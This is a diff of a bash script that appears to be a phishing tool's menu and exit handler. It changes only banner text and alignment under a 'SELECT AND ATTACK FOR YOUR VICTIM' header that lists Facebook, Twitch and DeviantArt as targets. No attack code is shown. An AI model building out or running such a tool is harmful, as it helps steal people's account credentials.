@@ -5,15 +5,14 @@ trap user_interrupt SIGINT
 trap user_interrupt SIGTSTP
 
 user_interrupt(){
-        printf "\e[0m\n"
-        printf "\e[0m\e[1;36m\t CTRL + C Pressed !!\n"
-        sleep 2
-        printf "\e[0m\n"
-        printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Technocyber for more\e[0m\n"
-        printf "\e[0m\n"
-        printf " \e[1;37m                             [ YOURS TECHNOCYBER & HACKERSPUNK ]\e[0m\n"
-        printf "\e[0m\n"
-        exit 1
+printf "\e[0m\n"
+printf "\e[0m\e[1;36m\t CTRL + C Pressed !!\n"
+sleep 2
+echo -b $green"[#]> THANKS FOR USING MY TOOL " |lolcat
+echo -b $green"[#]> BYE BYE! TAKE CARE COME AGAIN! " |lolcat
+sleep 1
+echo -b $green"[#]>YOURS (TECHNOCYBER & HACKERSPUNK) " |lolcat
+exit 1
 }
 
 stop() {
@@ -111,7 +110,7 @@ menu() {
 
 
 echo -e "#########################################################" | lolcat
-echo -e "#      SELECT AND ATTACK FOR YOUR VICTIM #" | lolcat
+echo -e "     # SELECT AND ATTACK FOR YOUR VICTIM #" | lolcat
 echo -e "#########################################################" | lolcat
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[0m\e[96m Facebook    \e[0m\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[0m\e[96m Twitch      \e[0m\e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[0m\e[96m DeviantArt\e[0m\n"
